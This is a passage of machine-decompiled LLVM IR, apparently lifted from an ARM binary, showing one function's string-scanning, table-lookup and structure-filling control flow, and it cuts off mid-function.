  br label %dec_label_pc_14548

dec_label_pc_14704:                               ; preds = %dec_label_pc_146ec
  %v0_14704 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14704, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_1470c

dec_label_pc_1470c.loopexit:                      ; preds = %dec_label_pc_146e0
  %v1_146e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_146e4, i32* @r5, align 4
  %v0_14718.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1470c

dec_label_pc_1470c:                               ; preds = %dec_label_pc_1470c.loopexit, %dec_label_pc_14704
  %v0_14718.pre = phi i32 [ %v0_14718.pre.pre, %dec_label_pc_1470c.loopexit ], [ %v0_146ec, %dec_label_pc_14704 ]
  store i32 -38448, i32* %r3.global-to-local, align 4
  %v0_14710 = load i32, i32* @lr, align 4
  %v2_14710 = add i32 %v0_14710, -38448
  store i32 %v2_14710, i32* %r1.global-to-local, align 4
  %v1_14718 = inttoptr i32 %v0_14718.pre to i8*
  br label %dec_label_pc_14714

dec_label_pc_14714:                               ; preds = %dec_label_pc_14728, %dec_label_pc_1470c
  %v0_14728 = phi i32 [ %v1_14728, %dec_label_pc_14728 ], [ %v2_14710, %dec_label_pc_1470c ]
  %v1_14714 = inttoptr i32 %v0_14728 to i8*
  %v2_14714 = load i8, i8* %v1_14714, align 1
  %v3_14714 = zext i8 %v2_14714 to i32
  store i32 %v3_14714, i32* %r2.global-to-local, align 4
  %v2_14718 = load i8, i8* %v1_14718, align 1
  %v3_14718 = zext i8 %v2_14718 to i32
  store i32 %v3_14718, i32* %r3.global-to-local, align 4
  %v9_1471c = icmp eq i8 %v2_14718, %v2_14714
  br i1 %v9_1471c, label %bb149, label %dec_label_pc_14728

bb149:                                            ; preds = %dec_label_pc_14714
  %v2_14720 = add i32 %v0_14718.pre, 1
  store i32 %v2_14720, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14734

dec_label_pc_14728:                               ; preds = %dec_label_pc_14714
  %v1_14728 = add i32 %v0_14728, 1
  %v2_14728 = inttoptr i32 %v1_14728 to i8*
  %v3_14728 = load i8, i8* %v2_14728, align 1
  %v4_14728 = zext i8 %v3_14728 to i32
  store i32 %v4_14728, i32* %r3.global-to-local, align 4
  store i32 %v1_14728, i32* %r1.global-to-local, align 4
  %v2_1472c = icmp eq i8 %v3_14728, 0
  br i1 %v2_1472c, label %dec_label_pc_14734, label %dec_label_pc_14714

dec_label_pc_14734:                               ; preds = %dec_label_pc_14728, %bb149
  %v1_14758 = phi i32 [ %v2_14720, %bb149 ], [ %v0_14718.pre, %dec_label_pc_14728 ]
  %v1_14754 = phi i32 [ %v0_14728, %bb149 ], [ %v1_14728, %dec_label_pc_14728 ]
  %v2_1473c = sub i32 %v1_14754, %v2_14710
  store i32 %v2_1473c, i32* %r3.global-to-local, align 4
  %v8_14744 = icmp sgt i32 %v2_1473c, 1
  br i1 %v8_14744, label %.thread24, label %dec_label_pc_14748

dec_label_pc_14748:                               ; preds = %dec_label_pc_14734
  %v1_14748 = inttoptr i32 %v1_14758 to i8*
  %v2_14748 = load i8, i8* %v1_14748, align 1
  %v3_14748 = zext i8 %v2_14748 to i32
  store i32 %v3_14748, i32* %r2.global-to-local, align 4
  %v1_1474c = inttoptr i32 %v1_14754 to i8*
  %v2_1474c = load i8, i8* %v1_1474c, align 1
  %v3_1474c = zext i8 %v2_1474c to i32
  store i32 %v3_1474c, i32* %r3.global-to-local, align 4
  %v9_14750 = icmp eq i8 %v2_14748, %v2_1474c
  br i1 %v9_14750, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_14748
  %v2_14754 = add i32 %v1_14754, 9
  store i32 %v2_14754, i32* %r1.global-to-local, align 4
  %v2_14758 = add i32 %v1_14758, 1
  store i32 %v2_14758, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_14748, %dec_label_pc_14734, %bb150
  %v0_14760 = phi i32 [ %v1_14754, %dec_label_pc_14748 ], [ %v1_14754, %dec_label_pc_14734 ], [ %v2_14754, %bb150 ]
  %v0_1475c = phi i32 [ %v1_14758, %dec_label_pc_14748 ], [ %v1_14758, %dec_label_pc_14734 ], [ %v2_14758, %bb150 ]
  %v1_1475c = inttoptr i32 %v0_1475c to i8*
  %v2_1475c = load i8, i8* %v1_1475c, align 1
  %v3_1475c = zext i8 %v2_1475c to i32
  store i32 %v3_1475c, i32* %r2.global-to-local, align 4
  %v1_14760 = add i32 %v0_14760, 9
  %v2_14760 = inttoptr i32 %v1_14760 to i8*
  %v3_14760 = load i8, i8* %v2_14760, align 1
  %v4_14760 = zext i8 %v3_14760 to i32
  store i32 %v4_14760, i32* %r3.global-to-local, align 4
  %v2_14764 = icmp eq i8 %v2_1475c, 0
  %v3_14768 = mul nuw nsw i32 %v4_14760, 256
  store i32 %v3_14768, i32* @ip, align 4
  br i1 %v2_14764, label %dec_label_pc_149c8, label %dec_label_pc_14770

dec_label_pc_14770:                               ; preds = %.thread24
  store i32 -38348, i32* %r3.global-to-local, align 4
  %v2_14774 = add i32 %v0_14710, -38348
  store i32 %v2_14774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14778

dec_label_pc_14778:                               ; preds = %dec_label_pc_147fc, %dec_label_pc_14770
  %v1_1478c = phi i32 [ %v1_147fc, %dec_label_pc_147fc ], [ %v2_14774, %dec_label_pc_14770 ]
  %v1_14778 = inttoptr i32 %v1_1478c to i8*
  %v2_14778 = load i8, i8* %v1_14778, align 1
  %v3_14778 = zext i8 %v2_14778 to i32
  store i32 %v3_14778, i32* %r3.global-to-local, align 4
  %v9_1477c = icmp eq i8 %v2_14778, %v2_1475c
  br i1 %v9_1477c, label %dec_label_pc_14784, label %dec_label_pc_147fc

dec_label_pc_14784:                               ; preds = %dec_label_pc_14778
  store i32 %v2_14774, i32* %r3.global-to-local, align 4
  %v2_1478c = sub i32 %v1_1478c, %v2_14774
  store i32 %v2_1478c, i32* %r1.global-to-local, align 4
  %v7_14794 = icmp slt i32 %v2_1478c, 18
  br i1 %v7_14794, label %bb152, label %dec_label_pc_14798

dec_label_pc_14798:                               ; preds = %dec_label_pc_14784
  %v1_14798 = and i32 %v3_14768, 1024
  %v2_14798 = icmp eq i32 %v1_14798, 0
  br i1 %v2_14798, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_14798
  %v2_1479c = add i32 %v2_1478c, -2
  store i32 %v2_1479c, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_14784, %dec_label_pc_14798, %bb151
  %v0_147a4 = phi i32 [ %v2_1478c, %dec_label_pc_14784 ], [ %v2_1478c, %dec_label_pc_14798 ], [ %v2_1479c, %bb151 ]
  store i32 -38396, i32* %r3.global-to-local, align 4
  %v1_147a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_147a4 = add i32 %v1_147a4, 32
  %v3_147a4 = inttoptr i32 %v2_147a4 to i32*
  store i32 %v0_147a4, i32* %v3_147a4, align 4
  %v0_147a8 = load i32, i32* @lr, align 4
  %v1_147a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_147a8 = add i32 %v1_147a8, %v0_147a8
  store i32 %v2_147a8, i32* %r3.global-to-local, align 4
  %v1_147ac = add i32 %v2_147a8, -1
  store i32 %v1_147ac, i32* %r0.global-to-local, align 4
  %v0_147b4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_147b0

dec_label_pc_147b0:                               ; preds = %dec_label_pc_147b0, %bb152
  %v0_147b0 = phi i32 [ %v1_147b0, %dec_label_pc_147b0 ], [ %v1_147ac, %bb152 ]
  %v1_147b0 = add i32 %v0_147b0, 1
  %v2_147b0 = inttoptr i32 %v1_147b0 to i8*
  %v3_147b0 = load i8, i8* %v2_147b0, align 1
  %v4_147b0 = zext i8 %v3_147b0 to i32
  store i32 %v4_147b0, i32* %r3.global-to-local, align 4
  store i32 %v1_147b0, i32* %r0.global-to-local, align 4
  %v8_147b8 = icmp sgt i32 %v0_147b4.pre, %v4_147b0
  br i1 %v8_147b8, label %dec_label_pc_147b0, label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %dec_label_pc_147b0
  %v2_147c4.neg = sub i32 38396, %v0_147a8
  %v2_147c8 = add i32 %v2_147c4.neg, %v1_147b0
  %v2_147cc = mul i32 %v2_147c8, 2
  store i32 %v2_147cc, i32* %r2.global-to-local, align 4
  %v2_147d0 = add i32 %v0_147a8, -38412
  store i32 %v2_147d0, i32* %r3.global-to-local, align 4
  %v2_147d4 = add i32 %v2_147cc, %v2_147d0
  %v3_147d4 = inttoptr i32 %v2_147d4 to i16*
  %v4_147d4 = load i16, i16* %v3_147d4, align 2
  %v6_147d4 = sext i16 %v4_147d4 to i32
  store i32 %v6_147d4, i32* %r1.global-to-local, align 4
  %v2_147dc = add i32 %v0_147a8, -38428
  store i32 %v2_147dc, i32* %r3.global-to-local, align 4
  %v2_147e0 = add i32 %v2_147cc, %v2_147dc
  %v3_147e0 = inttoptr i32 %v2_147e0 to i16*
  %v4_147e0 = load i16, i16* %v3_147e0, align 2
  %v6_147e0 = sext i16 %v4_147e0 to i32
  %v1_147e4 = load i32, i32* @ip, align 4
  %v2_147e4 = or i32 %v1_147e4, %v6_147d4
  %v2_147e8 = and i32 %v2_147e4, %v6_147e0
  store i32 %v2_147e8, i32* %r1.global-to-local, align 4
  store i32 -38348, i32* %r3.global-to-local, align 4
  %v2_147f0 = add i32 %v0_147a8, -38348
  store i32 %v2_147f0, i32* %r0.global-to-local, align 4
  store i32 %v2_147e8, i32* %stack_var_-72, align 4
  %v0_14814.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14808

dec_label_pc_147fc:                               ; preds = %dec_label_pc_14778
  %v1_147fc = add i32 %v1_1478c, 1
  %v2_147fc = inttoptr i32 %v1_147fc to i8*
  %v3_147fc = load i8, i8* %v2_147fc, align 1
  %v4_147fc = zext i8 %v3_147fc to i32
  store i32 %v4_147fc, i32* %r3.global-to-local, align 4
  store i32 %v1_147fc, i32* %r0.global-to-local, align 4
  %v2_14800 = icmp eq i8 %v3_147fc, 0
  br i1 %v2_14800, label %dec_label_pc_14808, label %dec_label_pc_14778

dec_label_pc_14808:                               ; preds = %dec_label_pc_147fc, %dec_label_pc_147bc
  %v0_14814 = phi i32 [ %v0_14814.pre, %dec_label_pc_147bc ], [ %v0_1475c, %dec_label_pc_147fc ]
  %v0_14810 = phi i32 [ %v1_147e4, %dec_label_pc_147bc ], [ %v3_14768, %dec_label_pc_147fc ]
  %v0_14808 = load i32, i32* @r4, align 4
  %v1_14808 = and i32 %v0_14808, 4
  %v1_1480c = and i32 %v0_14808, -5
  store i32 %v1_1480c, i32* %r3.global-to-local, align 4
  %v1_14810 = and i32 %v0_14810, 3840
  store i32 %v1_14810, i32* %r2.global-to-local, align 4
  %v1_14814 = inttoptr i32 %v0_14814 to i8*
  %v2_14814 = load i8, i8* %v1_14814, align 1
  %v3_14814 = zext i8 %v2_14814 to i32
  store i32 %v3_14814, i32* %r1.global-to-local, align 4
  %v2_14818 = or i32 %v1_1480c, %v1_14810
  store i32 %v2_14818, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_14808, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_14824 = load i32, i32* %r7.global-to-local, align 4
  %v2_14824 = add i32 %v1_14824, 20
  %v3_14824 = inttoptr i32 %v2_14824 to i32*
  store i32 %tmp181, i32* %v3_14824, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1482c = load i32, i32* %r1.global-to-local, align 4
  %v1_1482c = load i32, i32* %r7.global-to-local, align 4
  %v2_1482c = add i32 %v1_1482c, 12
  %v3_1482c = inttoptr i32 %v2_1482c to i32*
  store i32 %v0_1482c, i32* %v3_1482c, align 4
  %v0_14830 = load i32, i32* %r7.global-to-local, align 4
  %v1_14830 = add i32 %v0_14830, 4
  %v2_14830 = inttoptr i32 %v1_14830 to i32*
  %v3_14830 = load i32, i32* @r5, align 4
  store i32 %v3_14830, i32* %v2_14830, align 4
  %v4_14830 = add i32 %v0_14830, 8
  %v5_14830 = inttoptr i32 %v4_14830 to i32*
  %v6_14830 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_14830, i32* %v5_14830, align 4
  %v0_14834 = load i32, i32* %r2.global-to-local, align 4
  %v1_14834 = load i32, i32* %r7.global-to-local, align 4
  %v2_14834 = add i32 %v1_14834, 16
  %v3_14834 = inttoptr i32 %v2_14834 to i32*
  store i32 %v0_14834, i32* %v3_14834, align 4
  %v0_14838 = load i32, i32* %r3.global-to-local, align 4
  %v1_14838 = load i32, i32* %r7.global-to-local, align 4
  %v2_14838 = add i32 %v1_14838, 28
  %v3_14838 = inttoptr i32 %v2_14838 to i32*
  store i32 %v0_14838, i32* %v3_14838, align 4
  %v0_1483c = load i32, i32* %r0.global-to-local, align 4
  %v1_1483c = inttoptr i32 %v0_1483c to i8*
  %v2_1483c = load i8, i8* %v1_1483c, align 1
  %v3_1483c = zext i8 %v2_1483c to i32
  store i32 %v3_1483c, i32* %r2.global-to-local, align 4
  %v2_14840 = icmp eq i8 %v2_1483c, 0
  br i1 %v2_14840, label %dec_label_pc_14848, label %dec_label_pc_148cc

dec_label_pc_14848:                               ; preds = %dec_label_pc_14808
  %v0_14848 = load i32, i32* %r6.global-to-local, align 4
  %v1_14848 = inttoptr i32 %v0_14848 to i8*
  %v2_14848 = load i8, i8* %v1_14848, align 1
  %v3_14848 = zext i8 %v2_14848 to i32
  store i32 %v3_14848, i32* %r3.global-to-local, align 4
  %v7_1484c = icmp eq i8 %v2_14848, 109
  br i1 %v7_1484c, label %.thread28, label %dec_label_pc_14860

.thread28:                                        ; preds = %dec_label_pc_14848
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_14854 = load i32, i32* %r7.global-to-local, align 4
  %v3_14854 = add i32 %v2_14854, 32
  %v4_14854 = inttoptr i32 %v3_14854 to i32*
  store i32 20, i32* %v4_14854, align 4
  %v1_14858 = load i32, i32* %r2.global-to-local, align 4
  %v2_14858 = load i32, i32* %r7.global-to-local, align 4
  %v3_14858 = add i32 %v2_14858, 28
  %v4_14858 = inttoptr i32 %v3_14858 to i32*
  store i32 %v1_14858, i32* %v4_14858, align 4
  br label %dec_label_pc_148cc

dec_label_pc_14860:                               ; preds = %dec_label_pc_14848
  store i32 1004, i32* %r3.global-to-local, align 4
  %v0_14864 = load i32, i32* @lr, align 4
  %v2_14864 = add i32 %v0_14864, 1004
  %v3_14864 = inttoptr i32 %v2_14864 to i32*
  %v4_14864 = load i32, i32* %v3_14864, align 4
  store i32 %v4_14864, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_1486c = load i32, i32* %r7.global-to-local, align 4
  %v2_1486c = add i32 %v1_1486c, 32
  %v3_1486c = inttoptr i32 %v2_1486c to i32*
  store i32 21, i32* %v3_1486c, align 4
  %v0_14870 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14870, i32* @ip, align 4
  %v1_14874 = add i32 %v0_14870, 10
  store i32 %v1_14874, i32* %r0.global-to-local, align 4
  %v0_1487c.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_1487c = inttoptr i32 %v0_1487c.pre to i8*
  br label %dec_label_pc_14878

dec_label_pc_14878:                               ; preds = %dec_label_pc_148bc, %dec_label_pc_14860
  %v1_14888 = phi i32 [ %v1_148bc, %dec_label_pc_148bc ], [ %v0_14870, %dec_label_pc_14860 ]
  %v1_14878 = inttoptr i32 %v1_14888 to i8*
  %v2_14878 = load i8, i8* %v1_14878, align 1
  %v3_14878 = zext i8 %v2_14878 to i32
  store i32 %v3_14878, i32* %r2.global-to-local, align 4
  %v2_1487c = load i8, i8* %v1_1487c, align 1
  %v3_1487c = zext i8 %v2_1487c to i32
  store i32 %v3_1487c, i32* %r3.global-to-local, align 4
  %v9_14880 = icmp eq i8 %v2_14878, %v2_1487c
  br i1 %v9_14880, label %dec_label_pc_14888, label %dec_label_pc_148bc

dec_label_pc_14888:                               ; preds = %dec_label_pc_14878
  %v2_14888 = sub i32 %v1_14888, %v0_14870
  store i32 %v2_14888, i32* %r3.global-to-local, align 4
  %v0_14890 = load i32, i32* %r7.global-to-local, align 4
  %v1_14890 = add i32 %v0_14890, 4
  store i32 %v1_14890, i32* %r0.global-to-local, align 4
  %v0_14894 = load i32, i32* @lr, align 4
  %v2_14894 = add i32 %v0_14894, 26508
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_1489c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1489c, i32* %r2.global-to-local, align 4
  %v4_148a0 = mul i32 %v2_14888, 4
  %v5_148a0 = add i32 %v2_14894, %v4_148a0
  %v6_148a0 = inttoptr i32 %v5_148a0 to i32*
  %v7_148a0 = load i32, i32* %v6_148a0, align 4
  store i32 %v7_148a0, i32* @ip, align 4
  store i32 84140, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_148a0)
  %v0_148ac = load i32, i32* %r0.global-to-local, align 4
  %v1_148b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_148b0 = add i32 %v1_148b0, 28
  %v3_148b0 = inttoptr i32 %v2_148b0 to i32*
  store i32 %v0_148ac, i32* %v3_148b0, align 4
  %v7_148b4 = icmp sgt i32 %v0_148ac, 5
  br i1 %v7_148b4, label %dec_label_pc_149c8, label %dec_label_pc_148cc

dec_label_pc_148bc:                               ; preds = %dec_label_pc_14878
  %v1_148bc = add i32 %v1_14888, 1
  store i32 %v1_148bc, i32* %r1.global-to-local, align 4
  %v3_148c0 = icmp ult i32 %v1_148bc, %v1_14874
  br i1 %v3_148c0, label %dec_label_pc_14878, label %dec_label_pc_149c8

dec_label_pc_148cc:                               ; preds = %.thread28, %dec_label_pc_14888, %dec_label_pc_14808
  %v0_148cc = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_148cc, 1
  br i1 %tmp156, label %dec_label_pc_14978, label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148cc
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_148ec = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_148d8

dec_label_pc_148d8:                               ; preds = %dec_label_pc_14960, %dec_label_pc_148d4
  %v9_148f8 = phi i32 [ 0, %dec_label_pc_148d4 ], [ %v1_14964, %dec_label_pc_14960 ]
  %v7_148dc = icmp sgt i32 %v9_148f8, 2
  br i1 %v7_148dc, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_148d8
  store i32 %v9_148ec, i32* %r3.global-to-local, align 4
  %v10_148f8 = add i32 %v9_148f8, %v9_148ec
  store i32 %v10_148f8, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_148d8
  store i32 %v3_14554.pre-phi, i32* @ip, align 4
  %v12_148e0 = mul i32 %v9_148f8, 4
  %v13_148e0 = add i32 %v12_148e0, %v3_14554.pre-phi
  store i32 %v13_148e0, i32* %r3.global-to-local, align 4
  %v9_148e8 = add i32 %v13_148e0, -12
  %v10_148e8 = inttoptr i32 %v9_148e8 to i8*
  %v11_148e8 = load i8, i8* %v10_148e8, align 4
  %v12_148e8 = zext i8 %v11_148e8 to i32
  store i32 %v12_148e8, i32* %r2.global-to-local, align 4
  %v9_148f0 = load i32, i32* %r7.global-to-local, align 4
  %v10_148f0 = add i32 %v9_148f0, %v9_148f8
  store i32 %v10_148f0, i32* %r3.global-to-local, align 4
  store i32 %v12_148e8, i32* %r1.global-to-local, align 4
  %v11_148fc = add i32 %v10_148f0, 36
  %v12_148fc = inttoptr i32 %v11_148fc to i8*
  store i8 %v11_148e8, i8* %v12_148fc, align 1
  %v0_14900.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_14920 = phi i32 [ %v10_148f8, %.thread38 ], [ %v0_14900.pre, %bb157 ]
  %v1_14900 = load i32, i32* %fp.global-to-local, align 4
  %v2_14900 = sub i32 %v0_14920, %v1_14900
  %v4_14900 = xor i32 %v1_14900, %v0_14920
  %v5_14900 = xor i32 %v2_14900, %v0_14920
  %v6_14900 = and i32 %v5_14900, %v4_14900
  %v7_14900 = icmp slt i32 %v6_14900, 0
  %v8_14900 = icmp slt i32 %v2_14900, 0
  %v9_14900 = icmp eq i32 %v0_14920, %v1_14900
  %v3_14904 = xor i1 %v8_14900, %v7_14900
  %v4_14904 = or i1 %v9_14900, %v3_14904
  br i1 %v4_14904, label %dec_label_pc_14914, label %dec_label_pc_14908

dec_label_pc_14908:                               ; preds = %bb158
  %v1_14908 = add i32 %v0_14920, -9
  %v3_14908 = sub i32 8, %v0_14920
  %v4_14908 = and i32 %v3_14908, %v0_14920
  %v5_14908 = icmp slt i32 %v4_14908, 0
  %v6_14908 = icmp slt i32 %v1_14908, 0
  %v7_14908 = icmp eq i32 %v0_14920, 9
  %v3_1490c = xor i1 %v6_14908, %v5_14908
  %v4_1490c = or i1 %v7_14908, %v3_1490c
  br i1 %v4_1490c, label %dec_label_pc_14910, label %dec_label_pc_149c8

dec_label_pc_14910:                               ; preds = %dec_label_pc_14908
  store i32 %v0_14920, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14914

dec_label_pc_14914:                               ; preds = %bb158, %dec_label_pc_14910
  store i32 %v3_14554.pre-phi, i32* @r2, align 4
  %v1_14918 = load i32, i32* %r8.global-to-local, align 4
  %v4_14918 = mul i32 %v1_14918, 4
  %v5_14918 = add i32 %v4_14918, %v3_14554.pre-phi
  store i32 %v5_14918, i32* %sb.global-to-local, align 4
  %v1_1491c = add i32 %v5_14918, -40
  %v2_1491c = inttoptr i32 %v1_1491c to i32*
  %v3_1491c = load i32, i32* %v2_1491c, align 4
  store i32 %v3_1491c, i32* %r5.global-to-local, align 4
  %v1_14920 = add i32 %v0_14920, -1
  store i32 %v1_14920, i32* %r3.global-to-local, align 4
  %v0_14924 = load i32, i32* %r7.global-to-local, align 4
  %v4_14924 = mul i32 %v1_14920, 4
  %v5_14924 = add i32 %v0_14924, %v4_14924
  store i32 %v5_14924, i32* %sl.global-to-local, align 4
  %v7_14928 = icmp eq i32 %v3_1491c, 8
  %v1_1492c = add i32 %v5_14924, 40
  %v2_1492c = inttoptr i32 %v1_1492c to i32*
  %v3_1492c = load i32, i32* %v2_1492c, align 4
  store i32 %v3_1492c, i32* @r0, align 4
  br i1 %v7_14928, label %dec_label_pc_14960, label %dec_label_pc_14934

dec_label_pc_14934:                               ; preds = %dec_label_pc_14914
  %v9_14934 = icmp eq i32 %v3_1492c, %v3_1491c
  br i1 %v9_14934, label %dec_label_pc_14958, label %bb159

bb159:                                            ; preds = %dec_label_pc_14934
  %v8_14938 = icmp eq i32 %v3_1492c, 8
  br i1 %v8_14938, label %dec_label_pc_14958, label %dec_label_pc_14940

dec_label_pc_14940:                               ; preds = %bb159
  %v0_14940 = call i32 @_promoted_size()
  %v0_14948 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14948, i32* @r0, align 4
  %v0_1494c = call i32 @_promoted_size()
  store i32 %v0_1494c, i32* %r0.global-to-local, align 4
  %v8_14954 = icmp sgt i32 %v0_14940, %v0_1494c
  br i1 %v8_14954, label %dec_label_pc_14960, label %dec_label_pc_14940.dec_label_pc_14958_crit_edge

dec_label_pc_14940.dec_label_pc_14958_crit_edge:  ; preds = %dec_label_pc_14940
  %v0_14958.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_1495c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %dec_label_pc_14940.dec_label_pc_14958_crit_edge, %dec_label_pc_14934, %bb159
  %v1_1495c = phi i32 [ %v1_1495c.pre, %dec_label_pc_14940.dec_label_pc_14958_crit_edge ], [ %v5_14924, %dec_label_pc_14934 ], [ %v5_14924, %bb159 ]
  %v0_14958 = phi i32 [ %v0_14958.pre, %dec_label_pc_14940.dec_label_pc_14958_crit_edge ], [ %v5_14918, %dec_label_pc_14934 ], [ %v5_14918, %bb159 ]
  %v1_14958 = add i32 %v0_14958, -40
  %v2_14958 = inttoptr i32 %v1_14958 to i32*
  %v3_14958 = load i32, i32* %v2_14958, align 4
  store i32 %v3_14958, i32* %r3.global-to-local, align 4
  %v2_1495c = add i32 %v1_1495c, 40
  %v3_1495c = inttoptr i32 %v2_1495c to i32*
  store i32 %v3_14958, i32* %v3_1495c, align 4
  br label %dec_label_pc_14960

dec_label_pc_14960:                               ; preds = %dec_label_pc_14940, %dec_label_pc_14914, %dec_label_pc_14958
  %v0_14960 = load i32, i32* %r7.global-to-local, align 4
  %v1_14960 = add i32 %v0_14960, 28
  %v2_14960 = inttoptr i32 %v1_14960 to i32*
  %v3_14960 = load i32, i32* %v2_14960, align 4
  %v0_14964 = load i32, i32* %r8.global-to-local, align 4
  %v1_14964 = add i32 %v0_14964, 1
  store i32 %v1_14964, i32* %r8.global-to-local, align 4
  %v1_14968 = add i32 %v3_14960, 2
  store i32 %v1_14968, i32* %r3.global-to-local, align 4
  %v6_14970 = icmp slt i32 %v1_14964, %v1_14968
  br i1 %v6_14970, label %dec_label_pc_148d8, label %dec_label_pc_14994

dec_label_pc_14978:                               ; preds = %dec_label_pc_148cc
  %v0_14978 = load i32, i32* %r7.global-to-local, align 4
  %v1_14978 = add i32 %v0_14978, 28
  %v2_14978 = inttoptr i32 %v1_14978 to i32*
  %v3_14978 = load i32, i32* %v2_14978, align 4
  store i32 %v3_14978, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_14980 = add i32 %v0_14978, 38
  %v4_14980 = inttoptr i32 %v3_14980 to i8*
  store i8 1, i8* %v4_14980, align 1
  %v0_14984 = load i32, i32* %r2.global-to-local, align 4
  %v3_14984 = mul i32 %v0_14984, 4
  store i32 %v3_14984, i32* @r2, align 4
  %v0_14988 = load i32, i32* %r7.global-to-local, align 4
  %v1_14988 = add i32 %v0_14988, 40
  store i32 %v1_14988, i32* @r0, align 4
  %v2_1498c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1498c, i32* @r1, align 4
  %v0_14990 = call i32 @memcpy()
  store i32 %v0_14990, i32* %r0.global-to-local, align 4
  %v0_14994.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14994

dec_label_pc_14994:                               ; preds = %dec_label_pc_14960, %dec_label_pc_14978
  %v2_149b0 = phi i32 [ %v0_14994.pre, %dec_label_pc_14978 ], [ %v0_14960, %dec_label_pc_14960 ]
  %v1_14994 = add i32 %v2_149b0, 16
  %v2_14994 = inttoptr i32 %v1_14994 to i32*
  %v3_14994 = load i32, i32* %v2_14994, align 4
  store i32 %v3_14994, i32* %r3.global-to-local, align 4
  %v1_14998 = and i32 %v3_14994, 128
  %v2_14998 = icmp eq i32 %v1_14998, 0
  br i1 %v2_14998, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_14994
  %v3_1499c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_1499c, i32* %r3.global-to-local, align 4
  %v2_149a0 = inttoptr i32 %v2_149b0 to i32*
  %v3_149a0 = load i32, i32* %v2_149a0, align 4
  %v2_149a8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_149a8 = sub i32 %v2_149a8.pre, %v3_1499c
  store i32 %v3_149a8, i32* %r3.global-to-local, align 4
  %v5_149ac = mul i32 %v3_149a8, 4
  %v6_149ac = add i32 %v5_149ac, %v3_149a0
  store i32 %v6_149ac, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_14994
  %v1_149a445 = load i32, i32* %r6.global-to-local, align 4
  %v2_149a446 = add i32 %v1_149a445, 1
  store i32 %v2_149a446, i32* %r3.global-to-local, align 4
  %v3_149b0 = inttoptr i32 %v2_149b0 to i32*
  store i32 %v2_149a446, i32* %v3_149b0, align 4
  %v0_149b4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_149bc = phi i32 [ %v2_149b0, %.thread48 ], [ %v0_149b4.pre, %.thread50 ]
  %v1_149b4 = add i32 %v1_149bc, 28
  %v2_149b4 = inttoptr i32 %v1_149b4 to i32*
  %v3_149b4 = load i32, i32* %v2_149b4, align 4
  store i32 %v3_149b4, i32* %r3.global-to-local, align 4
  %v1_149b8 = add i32 %v3_149b4, 2
  store i32 %v1_149b8, i32* %r0.global-to-local, align 4
  %v0_149bc = load i32, i32* %fp.global-to-local, align 4
  %v2_149bc = add i32 %v1_149bc, 24
  %v3_149bc = inttoptr i32 %v2_149bc to i32*
  store i32 %v0_149bc, i32* %v3_149bc, align 4
  br i1 %v2_14998, label %dec_label_pc_149cc, label %bb161

bb161:                                            ; preds = %bb160
  %v1_149c0 = load i32, i32* @r2, align 4
  %v2_149c0 = load i32, i32* %r7.global-to-local, align 4
  %v3_149c0 = inttoptr i32 %v2_149c0 to i32*
  store i32 %v1_149c0, i32* %v3_149c0, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149c8:                               ; preds = %dec_label_pc_148bc, %dec_label_pc_144dc, %dec_label_pc_14624, %dec_label_pc_146d0, %dec_label_pc_146a8, %dec_label_pc_146b4, %dec_label_pc_145f0, %dec_label_pc_14908, %dec_label_pc_14888, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %bb161, %bb160, %dec_label_pc_149c8
  %v2_149d0 = load i32, i32* %stack_var_-36, align 4
